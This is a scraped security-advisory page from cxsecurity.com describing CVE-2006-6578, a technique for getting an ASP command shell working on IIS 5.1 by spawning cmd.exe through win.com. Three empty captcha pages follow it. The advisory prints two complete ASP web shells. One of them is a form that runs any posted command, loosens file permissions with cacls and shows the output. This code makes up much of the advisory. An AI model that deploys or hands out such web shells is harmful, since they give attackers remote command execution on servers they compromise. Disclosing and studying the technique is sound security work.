=== Content from securityreason.com_b95aebdb_20250125_180438.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **ASP Cmd Shell On IIS 5.1** **2006.12.18** Credit:  **[Brett Moore (brett moore security-assessment com)](https://cxsecurity.com/author/Brett%2BMoore%2B%28brett%2Bmoore%2Bsecurity-assessment%2Bcom%29/1/)**  Risk: **High** Local: **No** Remote: ****Yes**** CVE: **[CVE-2006-6578](https://cxsecurity.com/cveshow/CVE-2006-6578/ "Click to see CVE-2006-6578")** CWE: **[CWE-Other](https://cxsecurity.com/cwe/CWE-Other "CWE-Other")**  CVSS Base Score: **7.5/10** Impact Subscore: **6.4/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

========================================================================
====
% ASP Cmd Shell On IIS 5.1
% brett.moore (at) security-assessment (dot) com [email concealed]
========================================================================
====
ASP shells have been around since the dawn of time. On IIS 5.0 and prior
it
was simple to create a 'command prompt shell' using code similar to;
<%
Set oS = Server.CreateObject("WSCRIPT.SHELL")
output = oS.exec("cmd.exe > /c " & request("command")).stdout.readall
response.write output
%>
Permissions changes in IIS 5.1 prevented this method from working as
execution access was revoked to the IUSR\_Machine user.
During one boring afternoon it was decided to find a way around this,
and
what we found was 'slightly' interesting.
When IIS checks to see if an executable has 'execute' rights it is
checking against IUSR\_Machine. If execute rights are granted then the
new process is created, under the IWAM\_Machine account.
Thus all that was needed was an executable that could be run by
IUSR\_Machine
and would then spawn an instance of cmd.exe.
We set about seeing what executables could be run by IUSR\_Machine. It
turns
out that execution access has been revoked to all files with the .exe
extension. We did however locate several .com files that could still be
executed. One in particular 'win.com' takes a command line as a
parameter
and will execute it.
Because of the 'double spawning' we can not make use of .stdout.readall,
and
need to revert to outputting to a file, and reading it back in.
Due to the process executing under a different account than that of the
ASP
processor, we need to jump through a couple of hoops.
\* The folder that we use must be WRITEABLE by IWAM\_Machine
\* The folder that we use must be READABLE by IUSR\_Machine
\* We need to alter file permissions to allow IUSR\_Machine access to read
the file created by IWAM\_Machine
The accesschk tool from sysinternals, can easily identify a valid
location.
Our testings came up with c:windowspchealthERRORREPQHEADLES
IIS6.0 revokes access to both IUSR\_Machine and IWAM\_Machine, and
therefore
this technique will not work on that platform.
------------------------------------------------------------------------
----
<%
Dim oS,oSNet,oFSys, oF,szCMD, szTF
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("C")
If (szCMD <> "") Then
szTF = "c:windowspchealthERRORREPQHEADLES" & oFSys.GetTempName()
' Here we do the command
Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF &
"""",0,True)
response.write szTF
' Change perms
Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G
everyone:F",0,True)
Set oF = oFSys.OpenTextFile(szTF,1,False,0)
End If
%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name="C" size=70 value="<%= szCMD %>">
<input type=submit value="Run"></FORM><PRE>
Machine: <%=oSNet.ComputerName%><BR>
Username: <%=oSNet.UserName%><br>
<%
If (IsObject(oF)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oF.ReadAll)
oF.Close
Call oS.Run("win.com cmd.exe /c del "& szTF,0,True)
End If
%>
========================================================================
====
%
========================================================================
====

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2006120104)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_7c8079ad_20250126_105152.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_4edd4de4_20250126_105150.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_c54ca625_20250126_105151.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


